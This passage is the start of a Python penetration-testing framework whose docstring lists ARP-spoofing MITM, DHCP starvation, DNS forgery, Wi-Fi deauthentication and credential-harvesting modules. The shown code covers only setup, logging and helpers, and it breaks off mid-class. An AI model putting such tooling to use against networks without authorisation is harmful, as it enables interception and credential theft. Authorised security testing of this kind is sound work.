#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PrismStrike - Modular Interactive Network Operations & Security Assessment Framework
=================================================================================

A single-file, fully self-contained, interactive CLI framework for authorized
network operations, reconnaissance, packet crafting, passive capture and
layer-2 assessment. Every capability is implemented natively in this file; no
external toolkit is shelled out to except the optional `nmap` binary that the
`python-nmap` binding drives for its port-scanning sub-engine.

MANDATORY MODULE SUITE (all fully implemented below):
    1.  ICMP Reconnaissance .......... custom ICMP echo sweeps + granular probes
    2.  TCP Flag Crafter ............. SYN / ACK / FIN / RST / PSH + combinations
    3.  Hping Replicator ............. raw traffic generation harness (hping3 flags)
    4.  Nmap Sub-Engine .............. python-nmap integration (-F fast, -A aggressive)
    5.  Live Packet Sniffer .......... scapy sniff() with live layer decoding
    6.  ARP Discovery ................ native op=1 ARP cache sweep
    7.  ARP Spoofing / MITM .......... bi-directional op=2 poisoning + auto-restore
    8.  Kernel IP Forwarding ......... /proc + sysctl + registry toggle with revert
    9.  PCAP Analyst ................. offline capture parsing and reporting
    10. System Intel ................. interfaces, routes, DNS, TTL traceroute
    11. Logging Console .............. time-stamped .txt + .json activity ledger
    12. Dependency Doctor ............ runtime capability and dependency audit

v3.0 EXTENSION SUITE (fully implemented below - no placeholders, no stubs):
    13. Network Utilities ............ banner grab, TCP stream reassembly, path MTU, OS fingerprint
    14. DHCP Operations .............. discover, starvation test, rogue server with lease ledger
    15. DNS Toolkit .................. native resolver, tunnelling monitor, answer-forgery engine
    16. Wireless Lab ................. capability audit, monitor-mode scan, deauthentication lab
    17. Awareness Listeners .......... HTTP harvester page, protocol credential traps
    18. Reporting & Maintenance ...... HTML/Markdown reports, session pruning, throughput, socket map

v3.1 ONLINE OPERATIONS (every local capability gains a live/remote counterpart):
    08. PCAP Analyst (online) ........ live capture then instant analysis, HTTP(S) capture
                                       ingest with format validation, rolling stream telemetry
    09. System Intel (online) ........ remote host dossier: forward/reverse DNS, route decision,
                                       ICMP RTT + TTL stack hint, TCP connect probes
    10. Logging Console (online) ..... RFC5424 syslog shipping to a remote collector over
                                       UDP/TCP with optional TLS, queued and backfillable
    11. Dependency Doctor (online) ... release-index freshness audit (PyPI JSON API) with an
                                       apt-policy cross-check and honest offline degradation
    18. Reporting (online) ........... webhook multipart delivery and SMTP/STARTTLS email of
                                       the session summary, straight from the menu or the CLI
    01-07, 13-18 ONLINE MODES (v3.2) . every remaining module reaches the network:
                                       RDAP ownership, DNS over HTTPS, DNSBL reputation,
                                       online OUI vendor lookup, live TLS + HTTP inspection,
                                       alert relay (HTTP/NDJSON or syslog) fed by the detection
                                       hooks, and an NDJSON journal sink for the whole session
    Self-test ....................... 57 non-destructive checks: 15 platform + 25 extension +
                                       17 online, the online ones backed by loopback stubs

v3.2.1 REVIEW PASS (every review item triaged against the source; real defects fixed,
false positives documented rather than silently "fixed"):
  * bounded, lock-guarded counters in the hping replicator and TrafficStats, so a long or
    high-rate stress run cannot grow an unbounded reply list
  * portable loopback device selection (lo / lo0 / Npcap loopback) for the ICMP capture path
  * DHCP starvation pacing derived from the operator's own rate instead of a hardcoded sub-gap
  * remote capture downloads verify the declared length and refuse a truncated transfer
  * http_inspect keeps the partial redirect chain and body when a server closes early, and
    grades the response's security headers A-F
  * RECOMMENDED ADDITIONS: module 13 path-MTU black-hole detector, module 15 DNS rebinding
    trap, module 18 HTTP security-header scorer (also rendered in the HTML report and the
    Markdown summary)

v3.2.2 REVIEW PASS 2 (second review round; every item triaged against the source):
  * the dependency doctor now audits capture ingest: scapy pcap/pcapng readers, the pcapng
    writer, libpcap, tcpdump and dumpcap, with a concrete remedy per missing piece
  * the PCAP analyst refuses a PcapNG capture it cannot read (magic 0a0d0d0a, .pcapng and
    .ntar) instead of failing deep inside the reader, and reports how to fix it
  * module 17 awareness listeners: per-connection read/write deadlines (a silent or slow
    client cannot pin a worker) and a bounded worker pool that refuses and counts excess
    connections
  * module 17 protocol traps: a per-connection deadline and a per-service concurrency cap
  * stream reassembly re-bases any segment that resolves below the stored origin, so a
    hostile or re-sent packet can never inject a negative offset
  * module 18: atomic purge of transient raw captures, staged in a quarantine directory and
    renamed into place, with every structured artefact (.summary.json, reports, ledgers)
    preserved
  * self-test now runs 57 checks (15 platform + 25 extension + 17 online)

v3.2.3 REVIEW PASS 3 (two further items triaged against the source):
  * the openssl skip-guard for the TLS check was already present and is proven live with a
    PATH that lacks the binary (53 pass / 0 fail / 1 skip); the proposed `continue` guard
    was rejected because it is a SyntaxError outside a loop. The check was hardened
    instead: a binary that vanishes between the guard and the call, a failed or timed-out
    openssl run, and an empty certificate/key pair each record a specific reason (skip for
    a missing binary, failure with detail otherwise)
  * the requested `except (socket.timeout, TimeoutError): break` in the protocol traps
    already exists as `except (socket.timeout, OSError): break` (a superset), and the
    stdlib closes the request in a finally clause, so nothing hangs until GC. The genuine
    gap - a slow-drip client that satisfies every read deadline but never finishes - is
    closed by a per-connection watchdog that shuts the read side down at the wall-clock
    deadline (harvester 300s, traps 120s, operator visible in the artefact), with the
    self-test driving a dribbling client against it

v3.2.4 REVIEW PASS 4 (three further items triaged against the source):
  * "tls_inspect leaks the raw descriptor when a handshake is reset mid-flight" - the TLS
    layer detaches the raw socket as it takes ownership and closes the TLS socket on any
    failure, so nothing leaked (300/300 resets, descriptor table unchanged) and the
    proposed extra close is a no-op. The invariant is now explicit anyway: cleanup runs in
    a finally through `_reclaim_ownership()`, which closes a socket only while this
    process still owns the descriptor
  * "basic-auth decode can raise binascii.Error on token + '==='" - the call was already
    guarded, and the proposed modulo padding produces the identical string for the one
    length class that cannot decode (data length % 4 == 1). The real defect was silent
    corruption: the lenient decoder drops non-alphabet characters, so URL-safe tokens
    decoded to wrong bytes. `_decode_basic_auth_token()` now normalises padding exactly,
    translates the URL-safe alphabet, and refuses impossible lengths and stray characters
  * "remove the /proc/net/dev enforcement in the throughput sampler" - the abort was real
    on macOS and Windows, but the suggested scapy replacement (get_if_raw_hwaddr) returns
    a MAC address, not counters. The sampler now walks a backend chain: Linux kernel
    counters, BSD/macOS `netstat -ibn`, Windows PowerShell adapter statistics, and scapy
    packet accounting when an interface is named - and degrades to a clear
    "available: False" summary instead of ending the module

LEGAL / OPERATIONAL NOTE
------------------------
This framework transmits raw frames, forged ARP replies and crafted TCP/IP
packets. Run it ONLY on networks and hosts you own or for which you hold an
explicit, written penetration-testing authorisation. The framework enforces a
root/administrator check at startup because raw sockets, kernel forwarding
toggles and routing-adjacent operations require superuser privilege. Every
session is journaled to disk for audit purposes.

Author:  PrismStrike Project
License: Internal / authorised-test use only
"""

from __future__ import annotations

__framework__ = "PrismStrike"
__version__ = "3.2.4"
__build__ = "2026.10"

# ---------------------------------------------------------------------------
# Standard library imports
# ---------------------------------------------------------------------------
import argparse
import atexit
import datetime as _dt
import fnmatch
import http.client
import ipaddress
import json
import os
import platform
import random
import re
import shutil
import tempfile
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
import traceback
import uuid
from collections import Counter, OrderedDict, defaultdict, deque
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple, Union

# ---------------------------------------------------------------------------
# Automatic dependency bootstrap (single-file startup)
# ---------------------------------------------------------------------------
# Installs required Python packages on first launch. No helper files are needed.
# This requires internet access (or a working pip cache). Native programs/drivers
# such as the Nmap executable and Windows Npcap cannot be installed via pip.
def _auto_install_python_dependencies() -> None:
    import importlib.util as _importlib_util

    packages = (("scapy", "scapy"), ("nmap", "python-nmap"))
    missing = [package for module, package in packages
               if _importlib_util.find_spec(module) is None]
    if not missing:
        return

    print("[PrismStrike] Setting up required Python packages: %s" % ", ".join(missing),
          flush=True)

    def _run(command: List[str], timeout: int = 300) -> subprocess.CompletedProcess:
        return subprocess.run(command, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, text=True,
                              timeout=timeout, check=False)

    # Some Python installations do not include pip. Try bootstrapping pip first.
    pip_check = _run([sys.executable, "-m", "pip", "--version"], timeout=30)
    if pip_check.returncode != 0:
        ensurepip = _run([sys.executable, "-m", "ensurepip", "--upgrade"], timeout=180)
        pip_check = _run([sys.executable, "-m", "pip", "--version"], timeout=30)
        if pip_check.returncode != 0:
            detail = (ensurepip.stdout or pip_check.stdout or "pip/ensurepip unavailable").strip()
            print("[PrismStrike] Cannot install dependencies because pip is unavailable. %s" % detail[-1200:],
                  file=sys.stderr, flush=True)
            return

    base = [sys.executable, "-m", "pip", "install", "--disable-pip-version-check"]
    # Prefer user site outside a virtual environment; fall back to the active
    # interpreter environment if that install mode is rejected.
    commands = []
    if sys.prefix == getattr(sys, "base_prefix", sys.prefix):
        commands.append(base + ["--user"] + missing)
    commands.append(base + missing)
    last_output = ""
    for command in commands:
        try:
            result = _run(command)
            last_output = result.stdout or ""
            if result.returncode == 0:
                break
        except subprocess.TimeoutExpired as exc:
            last_output = str(exc)
    else:
        print("[PrismStrike] Automatic installation FAILED. Packages still missing: %s" % ", ".join(missing),
              file=sys.stderr, flush=True)
        print("[PrismStrike] pip output: %s" % (last_output.strip()[-1600:] or "no output"),
              file=sys.stderr, flush=True)
        print("[PrismStrike] Check internet access, Python package index access, and write permissions.",
              file=sys.stderr, flush=True)
        return

    # Confirm packages can actually be discovered by this same interpreter.
    still_missing = [package for module, package in packages
                     if _importlib_util.find_spec(module) is None]
    if still_missing:
        print("[PrismStrike] Installation completed but this Python cannot see: %s" % ", ".join(still_missing),
              file=sys.stderr, flush=True)
        print("[PrismStrike] Run this script with the same Python interpreter used for pip.",
              file=sys.stderr, flush=True)
    else:
        print("[PrismStrike] Python dependencies installed and verified.", flush=True)

try:
    _auto_install_python_dependencies()
except subprocess.TimeoutExpired:
    print("[PrismStrike] Dependency setup timed out. Check internet/package-index access.",
          file=sys.stderr, flush=True)
except Exception as _bootstrap_exc:
    print("[PrismStrike] Dependency setup error: %s: %s" %
          (type(_bootstrap_exc).__name__, _bootstrap_exc), file=sys.stderr, flush=True)

# ---------------------------------------------------------------------------
# Optional dependency bootstrap (graceful degradation, never a hard crash)
# ---------------------------------------------------------------------------
SCAPY_AVAILABLE: bool = False
SCAPY_ERROR: str = ""
scapy = None  # type: ignore[assignment]
scapy_scoped_ip = None

_scapy_stderr_backup = sys.stderr
try:
    with open(os.devnull, "w") as _devnull:
        sys.stderr = _devnull
        try:
            import scapy.all as scapy  # type: ignore[no-redef]
            from scapy.all import (  # type: ignore[import-not-found]
                ARP,
                DNS,
                Ether,
                ICMP,
                IP,
                Raw,
                TCP,
                UDP,
                conf as scapy_conf,
                get_if_hwaddr,
                get_if_list,
                rdpcap,
                send,
                sendp,
                sniff,
                sr,
                sr1,
                srp,
                wrpcap,
            )
            try:
                from scapy.base_classes import ScopedIP as scapy_scoped_ip
            except ImportError:          # scapy < 2.7: no scoped destinations
                scapy_scoped_ip = None
            SCAPY_AVAILABLE = True
        finally:
            sys.stderr = _scapy_stderr_backup
except Exception as _scapy_exc:  # pragma: no cover - environment dependent
    sys.stderr = _scapy_stderr_backup
    SCAPY_AVAILABLE = False
    SCAPY_ERROR = "%s: %s" % (type(_scapy_exc).__name__, _scapy_exc)

if SCAPY_AVAILABLE:
    try:
        scapy_conf.verb = 0          # silence per-packet chatter from scapy
        scapy_conf.iface = scapy_conf.iface  # touch attribute so routing is resolved lazily
    except Exception:
        # Non-fatal: verbosity tuning only.
        SCAPY_TUNING_ERROR = "scapy runtime tuning skipped"
    # scapy binds a logging StreamHandler to whatever sys.stderr was during
    # import (here: the devnull stream above, closed once import finished).
    # Re-pointing those handlers at the live stderr keeps later scapy warnings
    # from raising "I/O operation on closed file" inside the logging module.
    try:
        import logging as _logging_module
        for _scapy_logger_name in ("scapy.runtime", "scapy.loading", "scapy.interfaces", "scapy"):
            for _log_handler in _logging_module.getLogger(_scapy_logger_name).handlers:
                _stream = getattr(_log_handler, "stream", None)
                if _stream is None:
                    continue
                if getattr(_stream, "closed", False) or _stream is not sys.stderr:
                    try:
                        _log_handler.stream = sys.stderr
                    except (AttributeError, ValueError):
                        continue
    except Exception:
        # Logging plumbing is best-effort; packet handling never depends on it.
        SCAPY_LOGGING_REBIND_ERROR = "scapy log handler rebind skipped"

NMAP_LIB_AVAILABLE: bool = False
# Rolling-horizon caps: a long or high-rate run must never grow an unbounded list.
HPING_REPLY_HORIZON: int = 10000
TRAFFIC_RTT_HORIZON: int = 50000
NMAP_LIB_ERROR: str = ""
nmap_lib = None  # type: ignore[assignment]
try:
    import nmap as nmap_lib  # type: ignore[no-redef]
    NMAP_LIB_AVAILABLE = True
except Exception as _nmap_exc:  # pragma: no cover - environment dependent
    NMAP_LIB_AVAILABLE = False
    NMAP_LIB_ERROR = "%s: %s" % (type(_nmap_exc).__name__, _nmap_exc)


# ---------------------------------------------------------------------------
# Global constants
# ---------------------------------------------------------------------------
SCRIPT_PATH = os.path.abspath(__file__)
SCRIPT_DIR = os.path.dirname(SCRIPT_PATH)
DEFAULT_LOG_DIR = os.path.join(SCRIPT_DIR, "logs")
ARTIFACT_DIRNAME = "artifacts"

DEFAULT_TIMEOUT = 2.0
DEFAULT_INTERVAL = 1.0
MAX_SWEEP_HOSTS = 4096
MAX_TCP_PROBES = 10000
MAX_PPS = 5000
HARD_PPS_CEILING = 20000
SNIFFER_DEFAULT_COUNT = 0
SNIFFER_STATS_PERIOD = 5.0
ARP_RESTORE_ROUNDS = 5
PROMPT_ABORT = object()          # sentinel returned by prompts on user abort

FLAG_MAP = OrderedDict([
    ("SYN", "S"),
    ("ACK", "A"),
    ("FIN", "F"),
    ("RST", "R"),
    ("PSH", "P"),
    ("URG", "U"),
    ("ECE", "E"),
    ("CWR", "C"),
])

ICMP_TYPE_NAMES = {
    0: "Echo Reply",
    3: "Destination Unreachable",
    4: "Source Quench",
    5: "Redirect",
    8: "Echo Request",
    9: "Router Advertisement",
    10: "Router Solicitation",
    11: "Time Exceeded",
    12: "Parameter Problem",
    13: "Timestamp Request",
    14: "Timestamp Reply",
    15: "Information Request",
    16: "Information Reply",
    17: "Address Mask Request",
    18: "Address Mask Reply",
}

ICMP_CODE_NAMES = {
    0: {0: "net unreachable", 1: "host unreachable", 2: "protocol unreachable",
        3: "port unreachable", 4: "fragmentation needed", 5: "source route failed",
        9: "net administratively prohibited", 10: "host administratively prohibited",
        13: "communication administratively filtered"},
    3: {0: "network unreachable", 1: "host unreachable", 2: "protocol unreachable",
        3: "port unreachable", 4: "fragmentation needed / DF set",
        5: "source route failed", 6: "destination network unknown",
        7: "destination host unknown", 9: "network administratively prohibited",
        10: "host administratively prohibited", 11: "network unreachable for TOS",
        12: "host unreachable for TOS", 13: "communication administratively filtered"},
    11: {0: "TTL exceeded in transit", 1: "fragment reassembly time exceeded"},
}

# Protocol catalogue used by the sniffer's layer decoder and PCAP analyst.
IP_PROTO_NAMES = {
    1: "ICMP", 2: "IGMP", 6: "TCP", 17: "UDP", 41: "IPv6", 47: "GRE",
    50: "ESP", 51: "AH", 58: "ICMPv6", 89: "OSPF", 103: "PIM", 112: "VRRP",
    132: "SCTP",
}

COMMON_PORTS = {
    20: "ftp-data", 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "domain",
    67: "dhcp", 68: "dhcp", 69: "tftp", 80: "http", 110: "pop3", 111: "rpcbind",
    123: "ntp", 135: "msrpc", 137: "netbios-ns", 138: "netbios-dgm", 139: "netbios-ssn",
    143: "imap", 161: "snmp", 162: "snmptrap", 179: "bgp", 389: "ldap", 443: "https",
    445: "microsoft-ds", 465: "smtps", 514: "syslog", 515: "printer", 587: "submission",
    631: "ipp", 636: "ldaps", 993: "imaps", 995: "pop3s", 1080: "socks", 1194: "openvpn",
    1433: "ms-sql", 1521: "oracle", 1723: "pptp", 2049: "nfs", 3128: "squid",
    3306: "mysql", 3389: "rdp", 5060: "sip", 5432: "postgres", 5900: "vnc",
    6379: "redis", 8080: "http-alt", 8443: "https-alt", 9200: "elasticsearch",
    11211: "memcached", 27017: "mongodb",
}


def scapy_version_string() -> str:
    """
    Report the scapy release.

    `import scapy.all as scapy` binds the *submodule* scapy.all, which carries
    no __version__ attribute, so the version is read from the package root and
    finally from installed distribution metadata.
    """
    if not SCAPY_AVAILABLE:
        return SCAPY_ERROR or "scapy unavailable"
    for candidate in (sys.modules.get("scapy"),):
        version = getattr(candidate, "__version__", None)
        if version:
            return "v%s" % version
    try:
        from importlib.metadata import version as _distribution_version
        return "v%s" % _distribution_version("scapy")
    except Exception:
        return "version unknown"


# ---------------------------------------------------------------------------
# Terminal colour palette (auto-disabled for non-tty / NO_COLOR / --no-color)
# ---------------------------------------------------------------------------
class Palette:
    """ANSI escape manager. Colour can be globally disabled for log hygiene."""

    CODES = {
        "reset": "\033[0m", "bold": "\033[1m", "dim": "\033[2m", "italic": "\033[3m",
        "red": "\033[31m", "green": "\033[32m", "yellow": "\033[33m",
        "blue": "\033[34m", "magenta": "\033[35m", "cyan": "\033[36m",
        "white": "\033[37m", "grey": "\033[90m", "bred": "\033[91m",
        "bgreen": "\033[92m", "byellow": "\033[93m", "bblue": "\033[94m",
        "bmagenta": "\033[95m", "bcyan": "\033[96m",
    }
    enabled = True

    @classmethod
    def configure(cls, enabled: bool) -> None:
        cls.enabled = bool(enabled)

    @classmethod
    def paint(cls, text: str, *styles: str) -> str:
        if not cls.enabled or not styles:
            return str(text)
        prefix = "".join(cls.CODES.get(s, "") for s in styles)
        return "%s%s%s" % (prefix, text, cls.CODES["reset"])


def c(text: Any, *styles: str) -> str:
    """Colourise `text` with zero or more style names."""
    return Palette.paint(str(text), *styles)


def out(message: str = "") -> None:
    """Safe stdout write that never raises on a broken pipe."""
    try:
        sys.stdout.write("%s\n" % message)
        sys.stdout.flush()
    except (BrokenPipeError, OSError, ValueError):
        # Output stream closed or redirected beneath us; nothing sane to do.
        return


def ok(message: str) -> None:
    out("%s %s" % (c("[+]", "bgreen", "bold"), message))


def err(message: str) -> None:
    out("%s %s" % (c("[-]", "bred", "bold"), message))


def warn(message: str) -> None:
    out("%s %s" % (c("[!]", "byellow", "bold"), message))


def note(message: str) -> None:
    out("%s %s" % (c("[*]", "bcyan", "bold"), message))


def dbg(message: str) -> None:
    out("%s %s" % (c("[~]", "grey"), message))


def rule(width: int = 78, char: str = "=") -> None:
    out(c(char * width, "grey"))


def heading(title: str, width: int = 78) -> None:
    out("")
    out(c(title.center(width, " ")[:width], "bmagenta", "bold"))
    rule(width)


def kv_table(rows: Sequence[Tuple[str, Any]], key_width: int = 22, indent: int = 2) -> None:
    """Render a simple aligned key/value table."""
    pad = " " * indent
    for key, value in rows:
        out("%s%s %s" % (pad, c(str(key).ljust(key_width), "cyan"), value))


def format_bytes(count: Union[int, float]) -> str:
    try:
        size = float(count)
    except (TypeError, ValueError):
        return "0 B"
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if abs(size) < 1024.0:
            return "%.1f %s" % (size, unit) if unit != "B" else "%d B" % int(size)
        size /= 1024.0
    return "%.1f PB" % size


def format_duration(seconds: Union[int, float]) -> str:
    try:
        total = float(seconds)
    except (TypeError, ValueError):
        return "0s"
    if total < 0:
        total = 0.0
    hours, rem = divmod(int(total), 3600)
    minutes, secs = divmod(rem, 60)
    if hours:
        return "%dh %dm %ds" % (hours, minutes, secs)
    if minutes:
        return "%dm %ds" % (minutes, secs)
    return "%.2fs" % total


def format_timestamp(epoch: Optional[float] = None) -> str:
    stamp = time.time() if epoch is None else epoch
    return _dt.datetime.fromtimestamp(stamp).strftime("%Y-%m-%d %H:%M:%S")


def hexdump(data: bytes, width: int = 16, max_bytes: int = 128, indent: str = "      ") -> str:
    """Classic hex + ASCII dump, bounded by `max_bytes`."""
    if not data:
        return indent + c("<empty payload>", "grey")
    chunk = bytes(data[:max_bytes])
    lines: List[str] = []
    for offset in range(0, len(chunk), width):
        row = chunk[offset:offset + width]
        hex_part = " ".join("%02x" % b for b in row)
        hex_part = hex_part.ljust(width * 3 - 1)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in row)
        lines.append("%s%s  %s  %s" % (indent, c("%04x" % offset, "grey"), hex_part, ascii_part))
    if len(data) > max_bytes:
        lines.append("%s%s" % (indent, c("[truncated %d more bytes]" % (len(data) - max_bytes), "grey")))
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Framework exception + guard decorators
# ---------------------------------------------------------------------------
class FrameworkError(Exception):
    """Recoverable framework-level error: message is shown, session continues."""


class AbortOperation(Exception):
    """Raised internally when the operator aborts a wizard; caught by menus."""


class InputExhausted(Exception):
    """
    Raised when standard input reaches end-of-file.

    Distinct from KeyboardInterrupt: a closed stdin means no further menu
    interaction is possible, so every interactive construct must unwind to the
    top level and end the session instead of looping on empty reads.
    """


def module_guard(label: str) -> Callable:
    """Wrap a module entry point so no exception can ever kill the CLI loop."""
    def decorator(func: Callable) -> Callable:
        def wrapper(*args: Any, **kwargs: Any) -> Any:
            start = time.time()
            try:
                return func(*args, **kwargs)
            except AbortOperation:
                warn("%s: operation aborted by operator." % label)
                return None
            except InputExhausted:
                warn("%s: input stream closed - unwinding to the menu." % label)
                raise
            except KeyboardInterrupt:
                warn("%s: interrupted by operator." % label)
                return None
            except FrameworkError as exc:
                err("%s: %s" % (label, exc))
                LOGGER.event("error", "%s: %s" % (label, exc), level="ERROR")
                return None
            except (OSError, ValueError, TypeError, RuntimeError) as exc:
                err("%s: %s: %s" % (label, type(exc).__name__, exc))
                LOGGER.event("error", "%s: %s: %s" % (label, type(exc).__name__, exc), level="ERROR")
                return None
            except Exception as exc:  # last-resort containment
                err("%s: unexpected failure: %s: %s" % (label, type(exc).__name__, exc))
                LOGGER.event(
                    "error",
                    "%s: unexpected failure: %s" % (label, exc),
                    level="CRITICAL",
                    data={"traceback": traceback.format_exc()[-4000:]},
                )
                return None
            finally:
                LOGGER.event(
                    "module_end",
                    "%s finished in %s" % (label, format_duration(time.time() - start)),
                    data={"module": label, "elapsed": round(time.time() - start, 3)},
                )
        wrapper.__name__ = getattr(func, "__name__", "wrapped")
        wrapper.__doc__ = getattr(func, "__doc__", "")
        return wrapper
    return decorator


# ---------------------------------------------------------------------------
# Central audit logger: human .txt ledger + machine .json event stream
# ---------------------------------------------------------------------------
class EventLogger:
    """
    Thread-safe, time-stamped journal of every operator action, scan and result.

    Files produced per session inside the log directory:
        prismstrike_<session>.log.txt      human-readable ledger (also mirrors terminal)
        prismstrike_<session>.events.json  newline-delimited JSON event stream
        prismstrike_<session>.summary.json session roll-up written at shutdown
        artifacts/<session>_<name>.json per-scan structured artefacts
    """

    def __init__(self, log_dir: str = DEFAULT_LOG_DIR, mirror_terminal: bool = False,
                 session_tag: str = "") -> None:
        self.log_dir = os.path.abspath(log_dir)
        self.artifact_dir = os.path.join(self.log_dir, ARTIFACT_DIRNAME)
        self.session_id = "%s-%s-%s" % (
            _dt.datetime.now().strftime("%Y%m%d-%H%M%S"),
            platform.node().replace(" ", "")[:16] or "host",
            uuid.uuid4().hex[:6],
        )
        if session_tag:
            safe_tag = re.sub(r"[^A-Za-z0-9_.-]", "_", session_tag)[:40]
            self.session_id = "%s-%s" % (self.session_id, safe_tag)
        self.txt_path = os.path.join(self.log_dir, "prismstrike_%s.log.txt" % self.session_id)
        self.json_path = os.path.join(self.log_dir, "prismstrike_%s.events.json" % self.session_id)
        self.summary_path = os.path.join(self.log_dir, "prismstrike_%s.summary.json" % self.session_id)
        self._lock = threading.RLock()
        self._txt_handle = None
        self._json_handle = None
        self._events: List[Dict[str, Any]] = []
        self.counters: Counter = Counter()
        self.mirror_terminal = bool(mirror_terminal)
        self.started_at = time.time()
        self.ended_at: Optional[float] = None
        self._closed = False
        self._in_log_write = False
        self._handles_ready = False
        self._dir_error = ""
        self._last_event_signature: Optional[Tuple[str, str, str]] = None
        self._last_event_at = 0.0
        self.suppressed_events = 0
        self.syslog_shipper: Any = None
        self._bootstrap()

    def _bootstrap(self) -> None:
        """Create the log directory tree. File handles open lazily on first write."""
        try:
            os.makedirs(self.log_dir, exist_ok=True)
            os.makedirs(self.artifact_dir, exist_ok=True)
        except OSError as exc:
            # Degrade to console-only logging rather than refusing to start.
            self._dir_error = str(exc)
            warn("logging subsystem degraded (filesystem error: %s)" % exc)

    def _ensure_open(self) -> None:
        """
        Open the .txt and .json streams on first use.

        Deferring the open keeps a constructed-but-unused logger from leaving
        empty session files behind (for example when `main()` rebinds the
        module-level logger to an operator-supplied --log-dir).
        """
        with self._lock:
            if self._handles_ready or self._closed:
                return
            self._handles_ready = True
            try:
                os.makedirs(self.log_dir, exist_ok=True)
                os.makedirs(self.artifact_dir, exist_ok=True)
                self._txt_handle = open(self.txt_path, "a", encoding="utf-8", buffering=1)
                self._json_handle = open(self.json_path, "a", encoding="utf-8", buffering=1)
            except OSError as exc:
                self._txt_handle = None
                self._json_handle = None
                warn("logging subsystem degraded (filesystem error: %s)" % exc)
                return
            try:
                self._txt_handle.write(
                    "\n%s\nPrismStrike SESSION %s\n%s\n"
                    % ("=" * 78, self.session_id, "=" * 78)
                )
                self._txt_handle.write(
                    "host=%s  os=%s  python=%s  euid=%s  cwd=%s\n"
                    % (platform.node(), platform.platform(), platform.python_version(),
                       self._euid(), os.getcwd())
                )
            except (OSError, AttributeError, TypeError, ValueError):
                # Header is best-effort; the logger remains functional without it.
                pass

    @staticmethod
    def _euid() -> str:
        try:
            return str(os.geteuid())
        except AttributeError:
            return "n/a"

    # -- core record ----------------------------------------------------
    def _is_repeat(self, kind: str, message: str, level: str) -> bool:
        """
        Collapse bursts of identical events.

        A runaway loop (for example an unbounded retry on a closed input
        stream) must never be able to fill the operator's disk. Identical
        (kind, message, level) triples inside a 400 ms window are counted
        rather than written; the suppression is reported once the stream moves
        on, so the ledger stays honest and compact.
        """
        with self._lock:
            now = time.time()
            signature = (kind, message, level.upper())
            if signature == self._last_event_signature and (now - self._last_event_at) < 0.4:
                self.suppressed_events += 1
                self.counters[kind] += 1
                if self.suppressed_events % 1000 == 0:
                    self._last_event_signature = None
                    return False
                return True
            self._last_event_signature = signature
            self._last_event_at = now
            if self.suppressed_events:
                pending = self.suppressed_events
                self.suppressed_events = 0
                self._write_txt_raw(
                    "[%s] [%-8s] [%-12s] %d duplicate event(s) of the previous entry suppressed\n"
                    % (format_timestamp(), "WARN", "throttle", pending))
            return False

    def _write_txt_raw(self, line: str) -> None:
        try:
            if self._txt_handle:
                self._txt_handle.write(line)
        except (OSError, ValueError):
            self._txt_handle = None

    def event(self, kind: str, message: str, level: str = "INFO",
              data: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        self._ensure_open()
        if self._is_repeat(kind, message, level):
            return OrderedDict([("ts", format_timestamp()), ("kind", kind),
                                ("message", message), ("suppressed", True)])
        record = OrderedDict()
        record["ts"] = format_timestamp()
        record["epoch"] = round(time.time(), 4)
        record["session"] = self.session_id
        record["level"] = level.upper()
        record["kind"] = kind
        record["message"] = str(message)
        if data is not None:
            record["data"] = data
        with self._lock:
            self.counters[kind] += 1
            if level.upper() in ("ERROR", "CRITICAL"):
                self.counters["errors"] += 1
            self._events.append(record)
            self._write_txt(record)
            self._write_json(record)
        self._ship_to_syslog(kind, str(message), level)
        return record

    def attach_syslog(self, shipper: Any) -> None:
        """
        Attach (or detach with None) a remote syslog collector.

        Attached shippers receive every journal event through a bounded, queued
        worker, so a dead or slow collector can never stall the operator's CLI
        and can never lose the local journal.
        """
        self.syslog_shipper = shipper
        self.event("online", "remote syslog collector %s"
                   % ("attached: %s" % shipper if shipper is not None else "detached"))

    def _ship_to_syslog(self, kind: str, message: str, level: str) -> None:
        """Best-effort remote fan-out; throttled duplicates are not shipped twice."""
        shipper = self.syslog_shipper
        if shipper is None:
            return
        try:
            shipper.send_line(level, kind, "[%s] %s" % (self.session_id, message))
        except Exception:
            # Remote delivery must never interfere with local journaling.
            pass

    def scan(self, module: str, summary: Dict[str, Any], target: str = "") -> str:
        """Persist a structured scan artefact and return its path."""
        self._ensure_open()
        payload = OrderedDict()
        payload["tool"] = __framework__
        payload["version"] = __version__
        payload["session"] = self.session_id
        payload["module"] = module
        payload["target"] = target
        payload["recorded_at"] = format_timestamp()
        payload["summary"] = summary
        name = "%s_%s_%s.json" % (self.session_id, module, uuid.uuid4().hex[:6])
        path = os.path.join(self.artifact_dir, name)
        try:
            with open(path, "w", encoding="utf-8") as handle:
                json.dump(payload, handle, indent=2, default=str)
            self.event("artifact", "scan artefact written: %s" % os.path.basename(path),
                       data={"path": path, "module": module, "target": target})
        except OSError as exc:
            self.event("warn", "artefact write failed: %s" % exc, level="WARN")
            return ""
        return path

    def terminal(self, line: str) -> None:
        """Mirror a terminal line into the human ledger (called by TerminalMirror)."""
        if not self.mirror_terminal or self._in_log_write:
            return
        self._ensure_open()
        clean = re.sub(r"\033\[[0-9;]*m", "", line)
        with self._lock:
            self._in_log_write = True
            try:
                if self._txt_handle:
                    self._txt_handle.write("[%s] | %s\n" % (format_timestamp(), clean))
            except (OSError, ValueError):
                self._txt_handle = None
            finally:
                self._in_log_write = False

    # -- writers ---------------------------------------------------------
    def _write_txt(self, record: Dict[str, Any]) -> None:
        if not self._txt_handle:
            return
        try:
            line = "[%s] [%-8s] [%-12s] %s" % (
                record["ts"], record["level"], record["kind"], record["message"])
            self._txt_handle.write(line + "\n")
            if "data" in record and record["data"]:
                blob = json.dumps(record["data"], default=str)
                if len(blob) > 1200:
                    blob = blob[:1200] + ' (truncated)'
                self._txt_handle.write("           -> %s\n" % blob)
        except (OSError, ValueError, TypeError):
            self._txt_handle = None

    def _write_json(self, record: Dict[str, Any]) -> None:
        if not self._json_handle:
            return
        try:
            self._json_handle.write(json.dumps(record, default=str) + "\n")
        except (OSError, ValueError, TypeError):
            self._json_handle = None

    # -- introspection ---------------------------------------------------
    def summary(self) -> Dict[str, Any]:
